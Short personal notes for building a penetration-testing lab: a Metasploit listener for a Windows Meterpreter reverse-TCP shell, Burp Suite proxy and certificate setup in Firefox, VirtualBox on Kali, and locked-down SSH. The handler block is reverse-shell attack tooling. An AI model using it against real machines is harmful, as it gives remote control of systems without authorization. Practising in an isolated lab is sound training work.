# setup meterpreter
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <kali ip>
set LPORT 5555
```
# Burbsuite
- burpsuite config : proxy/options/listeners/edit/127.0.0.1:8080 loopback only
- firefox config : settings/search proxy/network settings/settings/manual proxy config/set to 127.0.0.1:8080/use proxy for all protocol, socks v5=checked
  - error : "Software is Preventing Firefox From Safely Connecting to This Site"
  - firefox doesn't trust burpsuite for https, but trust only for http
  - go to http://burp/ and get burp certificate to make firefox trust burp
  - firefox/settings/privacy&security/certificates/view certifs/import/burp certif/ok for website and email
  - **warning** : do not add random certificates from non viable certificate authority  

# install VB on kali
- https://www.kali.org/docs/virtualization/install-virtualbox-host/

# setup vulnerable machines and kali
- https://www.rapid7.com/blog/post/2011/12/23/where-can-i-find-vulnerable-machines-for-my-penetration-testing-lab/

install ssh on kali
```
sudo apt-get install openssh-server
sudo systemctl enable ssh
sudo systemctl start ssh
```
kali vm, allow only one host for ssh (host machine)
```
sudo vim /etc/hosts.deny
    sshd: ALL
sudo vim /etc/hosts.allow
    sshd: <host machine ip>
```

change keyboard layout on metasploitabe : [not required](https://zsecurity.org/forums/topic/how-to-change-the-keyboard-layout-on-the-metaspoitable-vm/)

setup network adapter on bridged network to be accessible from hyper-V kali VM [source : Virtual Box Switch Types](https://www.philipdaniels.com/blog/2016/vm-networking-overview/)